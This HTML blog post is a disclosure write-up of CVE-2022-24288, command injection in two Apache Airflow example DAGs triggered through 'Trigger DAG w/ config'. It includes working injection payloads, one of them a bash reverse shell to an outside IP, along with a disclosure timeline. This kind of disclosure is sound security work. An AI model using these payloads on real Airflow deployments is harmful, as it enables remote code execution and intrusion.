<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
    <meta name="description" content="SummaryIn Apache Airflow, prior to version 2.2.4, some example DAGs did not properly sanitize user-provided params, making them susceptible to OS Command Injection from the web UI. ProductApache Airfl">
<meta property="og:type" content="article">
<meta property="og:title" content="CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs">
<meta property="og:url" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/index.html">
<meta property="og:site_name" content="happyhacking-k Blog">
<meta property="og:description" content="SummaryIn Apache Airflow, prior to version 2.2.4, some example DAGs did not properly sanitize user-provided params, making them susceptible to OS Command Injection from the web UI. ProductApache Airfl">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-1.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-2.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-3.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-4.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-5.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-6.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-7.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-8.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-9.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-10.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-11.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-1.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-2.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-3.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-4.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-5.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-6.png">
<meta property="og:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-7.png">
<meta property="article:published_time" content="2022-04-07T17:55:00.000Z">
<meta property="article:modified_time" content="2022-04-10T17:20:01.943Z">
<meta property="article:author" content="HEXO">
<meta property="article:tag" content="MY CVE">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-1.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/logo1.png">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/logo1.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/logo1.png">
          
        
    
    <!-- title -->
    <title>CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">

    
<link rel="stylesheet" href="/lib/meslo-LG/styles.css">

    
<link rel="stylesheet" href="/lib/justified-gallery/justifiedGallery.min.css">

    
<link rel="stylesheet" href="/css/style.css">

    <!-- rss -->
    
    
    <!-- jquery -->
    
<script src="/lib/jquery/jquery.min.js"></script>

<meta name="generator" content="Hexo 6.1.0"></head>

<body>
    <div class="banner">
<div id="blogtitel" class="blogtitel">happyhacking-k Blog</div>
<ul id="wrapper" class="wrapper">
  <div class="sun">
    <div class="star"></div>
  </div>
  <div class="mercury">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="venus">
    <div class="planet">
      <div class="shadow"></div>
    </div>
  </div>
  <div class="earth">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="mars">
    <div class="planet"><div class="shadow"></div></div>
  </div>
  <div class="jupiter">
    <div class="planet"><div class="shadow"></div></div>
  </div>
</ul>
</div>

    <div class="background">
      
        <div id="header-post">
  <a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about">About</a></li>
         
          <li><a href="/categories/Advisories">Security Advisories</a></li>
         
          <li><a href="/exploits">Exploits</a></li>
         
          <li><a href="/research">Research</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/2022/04/08/CVE-2018-4102-Apple-safari-address-bar-spoofing/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li>
        
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li>
        <li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/"><i class="fa fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&text=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&title=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&is_video=false&description=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs&body=Check out this article: http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/"><i class="fa fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&title=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&title=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&title=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&title=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&name=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs&description="><i class="fa fa-tumblr " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Product"><span class="toc-number">2.</span> <span class="toc-text">Product</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Affected-Version"><span class="toc-number">3.</span> <span class="toc-text">Affected Version</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Details"><span class="toc-number">4.</span> <span class="toc-text">Details</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-one-example-passing-params-via-test-command-py-command-injection"><span class="toc-number">4.1.</span> <span class="toc-text">RCE one: example_passing_params_via_test_command.py command injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-two-tutorial-py-DAG-command-injection"><span class="toc-number">4.2.</span> <span class="toc-text">RCE two: tutorial.py DAG command injection</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Coordinated-Disclosure-Timeline"><span class="toc-number">5.</span> <span class="toc-text">Coordinated Disclosure Timeline</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE"><span class="toc-number">6.</span> <span class="toc-text">CVE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-number">7.</span> <span class="toc-text">Resources</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Contact"><span class="toc-number">8.</span> <span class="toc-text">Contact</span></a></li></ol>
    </div>
  </span>
</div>

      
      <div class="content index width mx-auto px2 my4">
          
          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
      <span itemprop="name">happyhacking-k</span>
      </span>
      
        <!-- 不蒜子统计 -->
        <span id="busuanzi_container_page_pv" style='display:none'>
               READ: <span id="busuanzi_value_page_pv"></span> times
        </span>
      
      
    <div class="postdate">
        <time datetime="2022-04-07T17:55:00.000Z" itemprop="datePublished">2022-04-08</time>
    </div>


      
    <div class="article-tag">
        <i class="fa fa-tag"></i>
        <a class="tag-link-link" href="/tags/MY-CVE/" rel="tag">MY CVE</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h1 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h1><p>In Apache Airflow, prior to version 2.2.4, some example DAGs did not properly sanitize user-provided params, making them susceptible to OS Command Injection from the web UI.</p>
<h1 id="Product"><a href="#Product" class="headerlink" title="Product"></a>Product</h1><p>Apache Airflow</p>
<h1 id="Affected-Version"><a href="#Affected-Version" class="headerlink" title="Affected Version"></a>Affected Version</h1><p>prior to version 2.2.4</p>
<h1 id="Details"><a href="#Details" class="headerlink" title="Details"></a>Details</h1><p>In Apache Airflow, prior to version 2.2.4, In DAG script of airflow , there is two command injection vulnerability (RCE) in the some scripts, which an attacker can execute arbitrary commands on the system. The impact is even greater when airflow is configured for unauthenticated access. These two RCEs are assigned the same CVE number(CVE-2022-24288).</p>
<h2 id="RCE-one-example-passing-params-via-test-command-py-command-injection"><a href="#RCE-one-example-passing-params-via-test-command-py-command-injection" class="headerlink" title="RCE one: example_passing_params_via_test_command.py command injection"></a>RCE one: example_passing_params_via_test_command.py command injection</h2><p>Vulnerability summary:</p>
<p>In Apache Airflow, prior to version 2.2.4, there is a command injection vulnerability (RCE) in the script (example_passing_params_via_test_command.py), which can obtain the permission of the operating system.</p>
<p>Vulnerability principle:</p>
<p>It can be seen from the source code of example_passing_params_via_test_command script that there is the function of executing bash command, The parameters Foo and MIFF in the template expressions  and  are externally controllable and rendered through the jiaja2 template:</p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-1.png"></p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-2.png"></p>
<p>Further analysis “from airflow.operators.bash import BashOperator” code, we can see bash_command parameter value will be executed as a bash script;</p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-3.png"></p>
<p>Vulnerability exploitation：</p>
<p>Enter the DAGs menu and start example_passing_params_via_test_command task, select “Trigger DAG w&#x2F; config”.<br><a target="_blank" rel="noopener" href="http://192.168.3.17:8080/trigger?dag_id=example_passing_params_via_test_command">http://192.168.3.17:8080/trigger?dag_id=example_passing_params_via_test_command</a></p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-4.png"></p>
<p>To construct payload, we can know from the following code that we need to splice commands with semicolons after closing double quotation marks, so as to inject any operating system commands to be executed(RCE).</p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-5.png"></p>
<p>PAYLOAD：<code>&#123;&quot;foo&quot;:&quot;\&quot;;touch /tmp/pwnedaaaaa;\&quot;&quot;&#125;</code>, Then click trigger to execute the task.</p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-6.png"></p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-7.png"></p>
<p>Through the log and background view, it can be seen that any command has been executed successfully.</p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-8.png"></p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-9.png"></p>
<p>Further execute the reverse shell to obtain operating system permissions.<br>Payload: <code>&#123;&quot;foo&quot;:&quot;\&quot;;bash -i &gt;&amp; /dev/tcp/192.168.3.7/6666 0&gt;&amp;1;\&quot;&quot;&#125;</code></p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-10.png"></p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-one-11.png"></p>
<h2 id="RCE-two-tutorial-py-DAG-command-injection"><a href="#RCE-two-tutorial-py-DAG-command-injection" class="headerlink" title="RCE two: tutorial.py DAG command injection"></a>RCE two: tutorial.py DAG command injection</h2><p>Vulnerability summary：</p>
<p>Ithere is a command injection vulnerability (RCE) in the script (tutorial.py), which an attacker can execute arbitrary commands on the system.</p>
<p>Vulnerability principle：</p>
<p>It can be seen from the source code of tutorial script that there is the function of executing bash command, The parameters “my_param” in the template expressions  is externally controllable and rendered through the jinja2 template:</p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-1.png"></p>
<p>Further analysis “from airflow.operators.bash import BashOperator” code, we can see bash_command parameter value will be executed as a bash script;</p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-2.png"></p>
<p>Vulnerability exploitation:</p>
<p>Enter the DAGs menu and start tutorial task, select “Trigger DAG w&#x2F; config”.<br><a target="_blank" rel="noopener" href="http://192.168.3.17:8080/trigger?dag_id=tutorial">http://192.168.3.17:8080/trigger?dag_id=tutorial</a></p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-3.png"></p>
<p>To construct payload, we can know from the following code that we need to splice commands with semicolons after closing double quotation marks, so as to inject any operating system commands to be executed(RCE).</p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-4.png"></p>
<p>PAYLOAD：<code>&#123;&quot;my_param&quot;:&quot;\&quot;;touch /tmp/pwnedddddd;\&quot;&quot;&#125;</code>, Then click trigger to execute the task.</p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-5.png"></p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-6.png"></p>
<p>Through the log and background view, it can be seen that arbitrary command has been executed successfully.</p>
<p><img src="/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/RCE-two-7.png"></p>
<h1 id="Coordinated-Disclosure-Timeline"><a href="#Coordinated-Disclosure-Timeline" class="headerlink" title="Coordinated Disclosure Timeline"></a>Coordinated Disclosure Timeline</h1><p>2022-01-30: Report sent to <a href="mailto:&#x73;&#101;&#x63;&#117;&#x72;&#105;&#x74;&#121;&#64;&#97;&#112;&#97;&#x63;&#104;&#x65;&#46;&#x6f;&#x72;&#103;">&#x73;&#101;&#x63;&#117;&#x72;&#105;&#x74;&#121;&#64;&#97;&#112;&#97;&#x63;&#104;&#x65;&#46;&#x6f;&#x72;&#103;</a><br>2022-02-01: Issue is acknowledged<br>2022-02-23: Issue is fixed<br>2022-02-27: hackone award a $4,000 bounty</p>
<h1 id="CVE"><a href="#CVE" class="headerlink" title="CVE"></a>CVE</h1><p>CVE-2022-24288</p>
<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><p><a target="_blank" rel="noopener" href="https://lists.apache.org/thread/dbw5ozcmr0h0lhs0yjph7xdc64oht23t">https://lists.apache.org/thread/dbw5ozcmr0h0lhs0yjph7xdc64oht23t</a></p>
<h1 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h1><p>You can contact me at <a href="mailto:&#x68;&#97;&#x70;&#112;&#x79;&#x68;&#97;&#x63;&#x6b;&#105;&#x6e;&#x67;&#x40;&#x6f;&#117;&#x74;&#108;&#x6f;&#x6f;&#x6b;&#46;&#105;&#x74;">&#x68;&#97;&#x70;&#112;&#x79;&#x68;&#97;&#x63;&#x6b;&#105;&#x6e;&#x67;&#x40;&#x6f;&#117;&#x74;&#108;&#x6f;&#x6f;&#x6b;&#46;&#105;&#x74;</a>, please include a reference to my blog in any communication regarding this issue.</p>

  </div>
</article>


  <section id="comments" class="vcomment">

  </section>


      </div>
      
       <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about">About</a></li>
         
          <li><a href="/categories/Advisories">Security Advisories</a></li>
         
          <li><a href="/exploits">Exploits</a></li>
         
          <li><a href="/research">Research</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Summary"><span class="toc-number">1.</span> <span class="toc-text">Summary</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Product"><span class="toc-number">2.</span> <span class="toc-text">Product</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Affected-Version"><span class="toc-number">3.</span> <span class="toc-text">Affected Version</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Details"><span class="toc-number">4.</span> <span class="toc-text">Details</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-one-example-passing-params-via-test-command-py-command-injection"><span class="toc-number">4.1.</span> <span class="toc-text">RCE one: example_passing_params_via_test_command.py command injection</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RCE-two-tutorial-py-DAG-command-injection"><span class="toc-number">4.2.</span> <span class="toc-text">RCE two: tutorial.py DAG command injection</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Coordinated-Disclosure-Timeline"><span class="toc-number">5.</span> <span class="toc-text">Coordinated Disclosure Timeline</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE"><span class="toc-number">6.</span> <span class="toc-text">CVE</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Resources"><span class="toc-number">7.</span> <span class="toc-text">Resources</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Contact"><span class="toc-number">8.</span> <span class="toc-text">Contact</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&text=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&title=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&is_video=false&description=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs&body=Check out this article: http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&title=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&title=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&title=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&title=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://happyhacking-k.github.io/2022/04/08/CVE-2022-24288-Apache-Airflow-TWO-RCEs-in-example-DAGs/&name=CVE-2022-24288: Apache Airflow TWO RCEs in example DAGs&description="><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
      <ul>
        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
      </ul>
    </div>

  </div>
</div>

      
      <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2022 HEXO
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/about">About</a></li>
         
          <li><a href="/categories/Advisories">Security Advisories</a></li>
         
          <li><a href="/exploits">Exploits</a></li>
         
          <li><a href="/research">Research</a></li>
        
      </ul>
    </nav>
  </div>

        <span id="busuanzi_container_site_uv" style='display:none'>
                UV: <span id="busuanzi_value_site_uv"></span> times
        </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  
</footer>

      
<script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- Google Analytics -->

<!-- Disqus Comments -->


  
<script src="https://cdn.jsdelivr.net/npm/valine@1.4.18/dist/Valine.min.js"></script>

<script>
    var GUEST_INFO = ['nick','mail','link'];
    var guest_info = 'nick,mail,link'.split(',').filter(function(item){
        return GUEST_INFO.indexOf(item) > -1
    });
    var notify = 'false' == true;
    var verify = 'false' == true;
    new Valine({
        el: '.vcomment',
        notify: notify,
        verify: verify,
        appId: "Cd6dVOCUYn8foOJaMakQhxab-MdYXbMMI",
        appKey: "8vdkw6eF3LEfUIndKKMYS1tm",
        placeholder: "If you have any questions, you can leave a message here and I will reply quickly.",
        pageSize:'10',
        avatar:'mm',
        lang:'en'
    });
</script>


    </div>
</body>
</html>
